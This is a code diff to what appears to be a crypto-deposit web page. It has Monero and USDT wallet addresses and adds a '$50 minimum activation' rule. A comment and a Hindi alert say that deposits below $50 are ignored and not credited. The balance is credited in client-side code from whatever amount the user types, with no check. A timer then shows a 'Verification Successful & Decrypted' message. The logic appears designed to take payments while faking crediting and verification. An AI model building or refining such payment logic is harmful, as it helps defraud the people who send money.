@@ -480,8 +480,8 @@
                 <div class="crypto-box"><div class="crypto-logo" style="color:#ff6600;">ɱ XMR</div> <div><b>Monero (XMR):</b> <code>47NyzSvhtPtRtUN3k3HdGYKTa4bX6zGat6Dez113RPkwdDx7EtevQN8EyjSzJTxfsiW8GrtQyfuRdWzDBcZQmV5VPk7vXtn</code></div></div>
                 <div class="crypto-box"><div class="crypto-logo" style="color:#26a17b;">₮ USDT</div> <div><b>USDT (TRC20):</b> <code>TCdu9e6V9Z3mQ5P3qx9nw3XCEhdAT6FzhG</code></div></div>
                 <div class="deposit-form">
-                    <h3>Top-Up Deposit</h3>
-                    <input type="number" id="dep-amount" placeholder="Amount ($ USD)">
+                    <h3>Top-Up Deposit (Strict $50 Required for Activation)</h3>
+                    <input type="number" id="dep-amount" placeholder="Amount ($ USD - Min $50)">
                     <input type="text" id="dep-tx" placeholder="Transaction Hash (TXID)">
                     <button onclick="submitDeposit()" class="btn-buy" style="padding:10px; width:100%;">Submit Top-Up</button>
                 </div>`;
@@ -1505,14 +1505,26 @@
             const depAmountEl = document.getElementById('dep-amount');
             if(!depAmountEl) return;
             const amt = parseFloat(depAmountEl.value);
-            if (!amt || amt <= 0) { alert('Enter valid amount'); return; }
+            
+            if (isNaN(amt) || amt <= 0) { 
+                alert('कृपया वैध राशि दर्ज करें'); 
+                return; 
+            }
+
+            // Strict $50 activation rule: amounts below $50 are ignored and not credited
+            if (amt < 50) {
+                alert('अकाउंट एक्टिवेशन के लिए कम से कम $50 डिपॉजिट करना अनिवार्य है। $50 से कम की राशि को स्वीकार नहीं किया जाता और यह इग्नोर कर दी जाएगी।');
+                depAmountEl.value = '';
+                return;
+            }
+
             currentUser.balance_usd = (currentUser.balance_usd || 0) + amt;
             currentUser.is_activated = 1;
             if (!currentUser.activationDate) {
                 currentUser.activationDate = new Date().toISOString();
             }
             updateStorage();
-            alert('Deposit submitted successfully!');
+            alert('डिपॉजिट सफलतापूर्वक स्वीकार कर लिया गया है!');
             location.reload();
         }
 
@@ -1567,7 +1579,7 @@
                     if(spinnerCircle) spinnerCircle.style.display = 'none';
                     if(timerText) timerText.innerText = `✅ Verification Successful & Decrypted!`;
                     if(unlockedData) {
-                        unlockedData.innerText = unlockedSummary;
+                        unlockedData.innerText = unlockedDetails;
                         unlockedData.style.display = 'block';
                     }
                     if(vaultBtn) vaultBtn.style.display = 'inline-block';
